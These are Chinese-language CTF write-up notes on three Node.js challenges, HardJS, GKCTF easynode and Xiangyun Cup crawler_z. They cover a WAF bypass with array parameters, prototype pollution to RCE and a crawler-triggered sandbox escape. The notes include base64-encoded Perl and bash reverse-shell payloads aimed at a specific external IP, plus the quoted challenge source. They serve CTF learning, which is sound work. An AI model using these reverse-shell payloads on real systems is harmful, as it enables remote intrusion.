# node.js

# node.js

### ****[XNUCA2019Qualifier]HardJS****

**XSS**

看到这个robot.py感觉可能有xss

![Untitled](node%20js%201e075dab9cd848caae679178663119ea/Untitled.png)

**原型链污染**

### ****[GKCTF 2021]easynode****

看源码，对登录的用户名，密码有waf

![Untitled](node%20js%201e075dab9cd848caae679178663119ea/Untitled%201.png)

waf是通过for循环来逐个提取字符对比，使用数组绕过，让js的弱类型比较元素，而substr只支持字符串使用，，可以在pyload后面机上pyloda

后加入waf过滤的字符使其转化为str

username[]=admin'#&username[]=a&username=a&username=a&username=a&username= a&username=a&username=a&username=a&username=(&password=admin

![Untitled](node%20js%201e075dab9cd848caae679178663119ea/Untitled%202.png)

{"msg":"yes","token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJkYXRhIjpbImFkbWluJyMiLCJhIiwiYSIsImEiLCJhIiwiIGEiLCJhIiwiYSIsImEiLCIoIl0sImV4cCI6MTY2NTI4NjQ0NywiaWF0IjoxNjY1Mjg0NjQ3fQ.pr75fz90M-HkadS3GzcKIfFuNRkniRNsRRr1O9-OPRc"}

拿到管理员token

将username设为__proto__去访问addAdmin

并且拿该用户的token去adminDIV这样就可以在extend里做污染，然后RCE

![Untitled](node%20js%201e075dab9cd848caae679178663119ea/Untitled%203.png)

base64的内容perl -e 'use Socket;$i="49.232.206.37";$p=23456;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};’

data={"outputFunctionName":"_tmp1;global.process.mainModule.require('child_process').exec('echo%20YmFzaCAtYyAiYmFzaCAtaSA+JiAvZGV2L3RjcC80OS4yMzIuMjA2LjM3LzIzMzMgMD4mMSI=%3D%7Cbase64%20-d%7Cbash');var __tmp2"}

data={"outputFunctionName":"x;process.mainModule.require('child_process').exec('echo cGVybCAtZSAndXNlIFNvY2tldDskaT0iNDkuMjMyLjIwNi4zNyI7JHA9MjM0NTY7c29ja2V0KFMsUEZfSU5FVCxTT0NLX1NUUkVBTSxnZXRwcm90b2J5bmFtZSgidGNwIikpO2lmKGNvbm5lY3QoUyxzb2NrYWRkcl9pbigkcCxpbmV0X2F0b24oJGkpKSkpe29wZW4oU1RESU4sIj4mUyIpO29wZW4oU1RET1VULCI+JlMiKTtvcGVuKFNUREVSUiwiPiZTIik7ZXhlYygiL2Jpbi9zaCAtaSIpO307Jw==|base64 -d|bash');x"}

回到admin就触发了

### ****[2021祥云杯]cralwer_z****

user.js

```jsx
const express = require('express');
const crypto = require('crypto');
const createError = require('http-errors');
const { Op } = require('sequelize');
const { User, Token } = require('../database');
const utils = require('../utils');
const Crawler = require('../crawler');

const router = express.Router();

router.get('/', async (req, res) => {
    const user = await User.findByPk(req.session.userId)
    return res.render('index', { username: user.username });
});

router.get('/profile', async (req, res) => {
    const user = await User.findByPk(req.session.userId);
    return res.render('user', { user });
});

router.post('/profile', async (req, res, next) => {
    let { affiliation, age, bucket } = req.body;
    const user = await User.findByPk(req.session.userId);
    if (!affiliation || !age || !bucket || typeof (age) !== "string" || typeof (bucket) !== "string" || typeof (affiliation) != "string") {
        return res.render('user', { user, error: "Parameters error or blank." });
    }
    if (!utils.checkBucket(bucket)) {
        return res.render('user', { user, error: "Invalid bucket url." });
    }
    let authToken;
    try {
        await User.update({
            affiliation,
            age,
            personalBucket: bucket
        }, {
            where: { userId: req.session.userId }
        });
        const token = crypto.randomBytes(32).toString('hex');
        authToken = token;
        await Token.create({ userId: req.session.userId, token, valid: true });
        await Token.update({
            valid: false,
        }, {
            where: {
                userId: req.session.userId,
                token: { [Op.not]: authToken }
            }
        });
    } catch (err) {
        next(createError(500));
    }
    if (/^https:\/\/[a-f0-9]{32}\.oss-cn-beijing\.ichunqiu\.com\/$/.exec(bucket)) {
        res.redirect(`/user/verify?token=${authToken}`)
    } else {
        // Well, admin won't do that actually XD. 
        return res.render('user', { user: user, message: "Admin will check if your bucket is qualified later." });
    }
});

router.get('/verify', async (req, res, next) => {
    let { token } = req.query;
    if (!token || typeof (token) !== "string") {
        return res.send("Parameters error");
    }
    let user = await User.findByPk(req.session.userId);
    const result = await Token.findOne({
        token,
        userId: req.session.userId,
        valid: true
    });
    if (result) {
        try {
            await Token.update({
                valid: false
            }, {
                where: { userId: req.session.userId }
            });
            await User.update({
                bucket: user.personalBucket
            }, {
                where: { userId: req.session.userId }
            });
            user = await User.findByPk(req.session.userId);
            return res.render('user', { user, message: "Successfully update your bucket from personal bucket!" });
        } catch (err) {
            next(createError(500));
        }
    } else {
        user = await User.findByPk(req.session.userId);
        return res.render('user', { user, message: "Failed to update, check your token carefully" })
    }
})

// Not implemented yet
router.get('/bucket', async (req, res) => {
    const user = await User.findByPk(req.session.userId);
    if (/^https:\/\/[a-f0-9]{32}\.oss-cn-beijing\.ichunqiu\.com\/$/.exec(user.bucket)) {
        return res.json({ message: "Sorry but our remote oss server is under maintenance" });
    } else {
        // Should be a private site for Admin
        try {
            const page = new Crawler({
                userAgent: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36',
                referrer: 'https://www.ichunqiu.com/',
                waitDuration: '3s'
            });
            await page.goto(user.bucket);
            const html = page.htmlContent;
            const headers = page.headers;
            const cookies = page.cookies;
            await page.close();

            return res.json({ html, headers, cookies});
        } catch (err) {
            return res.json({ err: 'Error visiting your bucket. ' })
        }
    }
});

module.exports = router;
```

- 访问profile后生成一个token，跳转到verify然后存入personalBucket,在这个时候抓包让他访问不了verify

![Untitled](node%20js%201e075dab9cd848caae679178663119ea/Untitled%204.png)

- 再把第一个包改成自己的vps

![Untitled](node%20js%201e075dab9cd848caae679178663119ea/Untitled%205.png)

```jsx
<script>c='constructor';this[c][c]("c='constructor';require=this[c][c]('return process')().mainModule.require;var sync=require('child_process').spawnSync; var ls = sync('bash', ['-c','bash -i >& /dev/tcp/49.232.206.37/23456 0>&1'],);console.log(ls.output.toString());")()</script>
```

然后访问/user/bucket就可以反弹shell，bucket会去爬取对应页面

![Untitled](node%20js%201e075dab9cd848caae679178663119ea/Untitled%206.png)